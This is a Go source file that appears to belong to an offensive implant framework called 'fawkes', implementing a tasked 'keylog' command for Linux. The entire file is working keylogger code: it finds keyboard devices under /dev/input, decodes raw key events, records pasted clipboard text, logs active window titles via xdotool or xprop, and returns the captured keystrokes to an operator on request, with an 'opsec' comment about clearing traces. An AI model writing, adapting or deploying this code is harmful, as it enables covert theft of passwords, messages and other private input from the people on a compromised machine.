//go:build linux

package commands

import (
	"encoding/binary"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"fawkes/pkg/structs"
)

// inputEvent matches the Linux input_event struct (24 bytes on 64-bit).
type inputEvent struct {
	TimeSec  int64  // tv_sec
	TimeUsec int64  // tv_usec
	Type     uint16 // event type
	Code     uint16 // key code
	Value    int32  // 0=release, 1=press, 2=repeat
}

const (
	evKey          = 0x01 // EV_KEY
	inputEventSize = 24   // sizeof(struct input_event) on 64-bit
)

// keylogState holds the global keylogger state.
type keylogState struct {
	mu         sync.Mutex
	running    bool
	stopCh     chan struct{}
	buffer     strings.Builder
	startTime  time.Time
	keyCount   int
	shiftDown  bool
	ctrlDown   bool
	lastWindow string
}

var kl = &keylogState{}

type KeylogCommand struct{}

func (c *KeylogCommand) Name() string {
	return "keylog"
}

func (c *KeylogCommand) Description() string {
	return "Start/stop/dump a low-level keyboard logger via /dev/input"
}

type keylogArgs struct {
	Action string `json:"action"`
}

func (c *KeylogCommand) Execute(task structs.Task) structs.CommandResult {
	args, parseErr := unmarshalParams[keylogArgs](task)
	if parseErr != nil {
		return *parseErr
	}

	switch strings.ToLower(args.Action) {
	case "start":
		return keylogStart()
	case "stop":
		return keylogStop()
	case "dump":
		return keylogDump()
	case "status":
		return keylogStatus()
	case "clear":
		return keylogClear()
	default:
		return errorf("Unknown action: %s. Use: start, stop, dump, status, clear", args.Action)
	}
}

func keylogStart() structs.CommandResult {
	kl.mu.Lock()
	if kl.running {
		kl.mu.Unlock()
		return errorResult("Keylogger is already running")
	}
	kl.running = true
	kl.buffer.Reset()
	kl.startTime = time.Now()
	kl.keyCount = 0
	kl.shiftDown = false
	kl.ctrlDown = false
	kl.lastWindow = ""
	kl.stopCh = make(chan struct{})
	kl.mu.Unlock()

	devices, err := findKeyboardDevices()
	if err != nil || len(devices) == 0 {
		kl.mu.Lock()
		kl.running = false
		kl.mu.Unlock()
		if err != nil {
			return errorf("Error finding keyboard devices: %v", err)
		}
		return errorResult("No keyboard input devices found. Need root or input group membership.")
	}

	for _, dev := range devices {
		go keylogReadDevice(dev, kl.stopCh)
	}
	go trackActiveWindowLinux(kl.stopCh)

	return successf("Keylogger started on %d device(s) with window tracking. Use 'keylog -action dump' to view, 'keylog -action stop' to stop.", len(devices))
}

func keylogStop() structs.CommandResult {
	kl.mu.Lock()
	if !kl.running {
		kl.mu.Unlock()
		return errorResult("Keylogger is not running")
	}

	close(kl.stopCh)

	output := kl.buffer.String()
	duration := time.Since(kl.startTime)
	keyCount := kl.keyCount
	kl.running = false
	kl.buffer.Reset()
	kl.mu.Unlock()

	result := fmt.Sprintf("Keylogger stopped.\nDuration: %s\nKeystrokes captured: %d\n\n--- Captured Keystrokes ---\n%s",
		duration.Round(time.Second), keyCount, output)

	return successResult(result)
}

func keylogDump() structs.CommandResult {
	kl.mu.Lock()
	defer kl.mu.Unlock()

	if !kl.running {
		return errorResult("Keylogger is not running")
	}

	output := kl.buffer.String()
	duration := time.Since(kl.startTime)

	if output == "" {
		return successf("Keylogger running for %s — no keystrokes captured yet", duration.Round(time.Second))
	}

	result := fmt.Sprintf("Keylogger running for %s — %d keystrokes captured\n\n--- Captured Keystrokes ---\n%s",
		duration.Round(time.Second), kl.keyCount, output)

	return successResult(result)
}

func keylogStatus() structs.CommandResult {
	kl.mu.Lock()
	defer kl.mu.Unlock()

	if !kl.running {
		return successResult("Keylogger is not running.")
	}

	duration := time.Since(kl.startTime)
	bufSize := kl.buffer.Len()

	return successf("Keylogger status:\n  State:      running\n  Duration:   %s\n  Keystrokes: %d\n  Buffer:     %s",
		duration.Round(time.Second), kl.keyCount, formatFileSize(int64(bufSize)))
}

func keylogClear() structs.CommandResult {
	kl.mu.Lock()
	defer kl.mu.Unlock()

	if !kl.running {
		return errorResult("Keylogger is not running")
	}

	cleared := kl.keyCount
	kl.buffer.Reset()
	kl.keyCount = 0

	return successf("Buffer cleared (%d keystrokes removed). Keylogger continues running.", cleared)
}

// findKeyboardDevices scans /dev/input/event* for keyboard-capable devices.
func findKeyboardDevices() ([]string, error) {
	matches, err := filepath.Glob("/dev/input/event*")
	if err != nil {
		return nil, err
	}

	var keyboards []string
	for _, path := range matches {
		if isKeyboard(path) {
			keyboards = append(keyboards, path)
		}
	}
	return keyboards, nil
}

// isKeyboard checks if an input device supports keyboard events by
// reading EV_KEY capability via ioctl EVIOCGBIT.
func isKeyboard(path string) bool {
	f, err := os.Open(path)
	if err != nil {
		return false
	}
	defer f.Close()

	// EVIOCGBIT(0, ...) returns the event types supported.
	// We check bit 1 (EV_KEY). The ioctl number is computed as:
	// _IOC(_IOC_READ, 'E', 0x20+0, size) for ev type 0
	// Rather than syscalling ioctl, check /sys/class/input for capabilities.
	// Simpler approach: try to read a few bytes — if we can open it, check
	// /sys/class/input/eventN/device/capabilities/ev for EV_KEY bit.
	f.Close()

	// Extract eventN from path
	base := filepath.Base(path)
	capPath := fmt.Sprintf("/sys/class/input/%s/device/capabilities/ev", base)
	data, err := os.ReadFile(capPath)
	if err != nil {
		// Can't read capabilities — skip this device
		return false
	}

	caps := strings.TrimSpace(string(data))
	// EV_KEY = 1, so bit 1 must be set. The capabilities are hex bitmasks.
	// Common keyboard value: "120013" (bits 0,1,4,17,20 = SYN,KEY,MSC,LED,REP)
	// We check if bit 1 (EV_KEY) is set in the last hex nibble.
	if caps == "" {
		return false
	}

	// Parse the last hex character to check bit 1
	lastChar := caps[len(caps)-1]
	var nibble uint64
	if lastChar >= '0' && lastChar <= '9' {
		nibble = uint64(lastChar - '0')
	} else if lastChar >= 'a' && lastChar <= 'f' {
		nibble = uint64(lastChar-'a') + 10
	}

	// Bit 1 = EV_KEY
	if nibble&0x02 == 0 {
		return false
	}

	// Also verify it has actual key codes (not just a power button).
	// Check key capabilities for common keyboard keys (KEY_A=30).
	keyCapPath := fmt.Sprintf("/sys/class/input/%s/device/capabilities/key", base)
	keyData, err := os.ReadFile(keyCapPath)
	if err != nil {
		return false
	}
	keyStr := strings.TrimSpace(string(keyData))
	structs.ZeroBytes(keyData) // opsec: clear device capability data
	// A real keyboard will have many bits set. A simple check: the key
	// capabilities string should be longer than a few characters.
	return len(keyStr) > 10
}

// keylogReadDevice reads input events from a single device file.
func keylogReadDevice(path string, stopCh <-chan struct{}) {
	f, err := os.Open(path)
	if err != nil {
		return
	}
	defer f.Close()

	buf := make([]byte, inputEventSize)
	for {
		select {
		case <-stopCh:
			return
		default:
		}

		// Set a read deadline so we can check the stop channel periodically
		_ = f.SetReadDeadline(time.Now().Add(500 * time.Millisecond))

		n, err := f.Read(buf)
		if err != nil {
			if os.IsTimeout(err) {
				continue
			}
			return
		}
		if n < inputEventSize {
			continue
		}

		var ev inputEvent
		ev.TimeSec = int64(binary.LittleEndian.Uint64(buf[0:8]))
		ev.TimeUsec = int64(binary.LittleEndian.Uint64(buf[8:16]))
		ev.Type = binary.LittleEndian.Uint16(buf[16:18])
		ev.Code = binary.LittleEndian.Uint16(buf[18:20])
		ev.Value = int32(binary.LittleEndian.Uint32(buf[20:24]))

		if ev.Type != evKey {
			continue
		}

		kl.mu.Lock()

		// Track modifier state on press/release
		if ev.Code == 42 || ev.Code == 54 { // KEY_LEFTSHIFT, KEY_RIGHTSHIFT
			kl.shiftDown = ev.Value != 0
			kl.mu.Unlock()
			continue
		}
		if ev.Code == 29 || ev.Code == 97 { // KEY_LEFTCTRL, KEY_RIGHTCTRL
			kl.ctrlDown = ev.Value != 0
			kl.mu.Unlock()
			continue
		}

		// Only process key press events (value=1), not release(0) or repeat(2)
		if ev.Value == 1 {
			// Detect Ctrl+V paste and capture clipboard content
			if kl.ctrlDown && ev.Code == 47 { // KEY_V = 47
				kl.mu.Unlock()
				if clip := clipReadText(); clip != "" {
					kl.mu.Lock()
					if len(clip) > 200 {
						clip = clip[:200] + "..."
					}
					kl.buffer.WriteString(fmt.Sprintf("[PASTE:%s]", clip))
					kl.keyCount++
					kl.mu.Unlock()
				} else {
					kl.mu.Lock()
					kl.keyCount++
					kl.mu.Unlock()
				}
				continue
			}
			keyName := linuxKeyToString(ev.Code, kl.shiftDown)
			if keyName != "" {
				kl.buffer.WriteString(keyName)
				kl.keyCount++
			}
		}

		kl.mu.Unlock()
	}
}

// trackActiveWindowLinux periodically polls the active window title via
// xdotool (X11) or swaymsg (Wayland). Logs window changes to the buffer.
func trackActiveWindowLinux(stopCh <-chan struct{}) {
	ticker := time.NewTicker(2 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-stopCh:
			return
		case <-ticker.C:
			title := getActiveWindowLinux()
			if title == "" {
				continue
			}
			kl.mu.Lock()
			if title != kl.lastWindow {
				kl.buffer.WriteString(fmt.Sprintf("\n[%s] --- %s ---\n",
					time.Now().Format("15:04:05"), title))
				kl.lastWindow = title
			}
			kl.mu.Unlock()
		}
	}
}

// getActiveWindowLinux returns the active window title using available tools.
func getActiveWindowLinux() string {
	// Try xdotool first (X11)
	if out, err := execCmdTimeoutOutput("xdotool", "getactivewindow", "getwindowname"); err == nil {
		if title := strings.TrimSpace(string(out)); title != "" {
			return title
		}
	}

	// Try xprop with _NET_WM_NAME (X11, no xdotool dependency)
	if out, err := execCmdTimeoutOutput("xprop", "-root", "_NET_ACTIVE_WINDOW"); err == nil {
		s := strings.TrimSpace(string(out))
		// Parse: _NET_ACTIVE_WINDOW(WINDOW): window id # 0x1234567
		if idx := strings.LastIndex(s, "# "); idx != -1 {
			windowID := strings.TrimSpace(s[idx+2:])
			if nameOut, err := execCmdTimeoutOutput("xprop", "-id", windowID, "_NET_WM_NAME"); err == nil {
				nameStr := string(nameOut)
				if qStart := strings.Index(nameStr, "\""); qStart != -1 {
					if qEnd := strings.LastIndex(nameStr, "\""); qEnd > qStart {
						return nameStr[qStart+1 : qEnd]
					}
				}
			}
		}
	}

	return ""
}

